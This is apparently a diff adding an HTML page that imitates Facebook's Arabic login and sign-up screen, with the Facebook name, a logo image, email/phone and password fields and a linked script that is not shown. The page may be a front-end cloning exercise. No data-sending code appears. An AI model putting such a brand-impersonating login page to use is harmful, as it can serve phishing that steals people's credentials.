@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
+    <!-- bootstrap -->
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <!-- fontawesome -->
+    <link rel="stylesheet" href="css/all.min.css" />
+    <!-- main-css -->
+    <link rel="stylesheet" href="css/index-style.css" />
+  </head>
+  <body dir="rtl">
+    <div
+      class="overlay position-fixed top-0 end-0 start-0 bottom-0 d-none justify-content-center align-items-center"
+    >
+      <div class="child w-25 px-3">
+        <div class="d-flex justify-content-between align-items-center pt-3">
+          <h2>إنشاء حساب في فيسبوك</h2>
+          <i class="fa-solid fa-xmark fs-4 exit"></i>
+        </div>
+        <p>عملية سريعة وسهلة</p>
+        <div class="space"></div>
+        <div class="inputs-signout pt-3">
+            <input type="text" class="input-group mb-2 inputRight" placeholder="ادخل اسمك" id="useracc">
+            <input type="email" class="input-group mb-2 inputRight" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" id="useremail">
+            <input type="password" class="input-group mb-2 inputRight" placeholder="كلمة السر الجديدة" id="user-number">
+        </div>
+        <div class="button-sginup d-flex justify-content-center py-3">
+            <button class="b-signup">انشاء حساب في فيسبوك</button>
+        </div>
+      </div>
+    </div>
+    <section class="login py5">
+      <div class="container py-5">
+        <div class="row py-5">
+          <div class="col-md-7">
+            <div class="logo">
+              <img
+                src="image/4lCu2zih0ca.svg"
+                alt="facebook-logo"
+                class="img-fluid"
+                style="height: 70px; margin: -20px"
+              />
+            </div>
+            <div>
+              <h2 class="text">آخر عمليات تسجيل الدخول</h2>
+              <p>يمكنك النقر على صورتك أو إضافة حساب</p>
+            </div>
+            <div class="logins row">
+              <div class="card-facebook col-md-4">
+                <div
+                  class="add-icon d-flex justify-content-center align-items-center"
+                >
+                  <i class="fa-solid fa-circle-plus"></i>
+                </div>
+                <p class="text-center py-2">إضافة حساب</p>
+              </div>
+            </div>
+          </div>
+          <div class="col-md-5 mt-4 pp">
+            <div class="card-login p-4 bg-white">
+              <div class="inputs pt-2 position-relative">
+                <input
+                  type="text"
+                  placeholder="البريد الإلكتروني أو رقم الهاتف"
+                  class="input-group py-2 mb-3 emailEnter inputSign"
+                />
+                <input
+                  type="password"
+                  placeholder="كلمة السر"
+                  class="input-group py-2 passEnter inputSign"
+                />
+                <div class="eye">
+                  <i class="fa-regular fa-eye eye-show"></i>
+                </div>
+              </div>
+              <div class="erorr-send text-center py-2 text-danger"></div>
+              <div class="button">
+                <button class="w-100 my-3 b-login">تسجيل الدخول</button>
+              </div>
+              <div class="forget-pass text-center py-3">هل نسيت كلمة السر؟</div>
+              <div class="button-signin pt-5 pb-2 text-center">
+                <button class="b-signin">انشاء حساب جديد</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <script src="js/main.js"></script>
+  </body>
+</html>
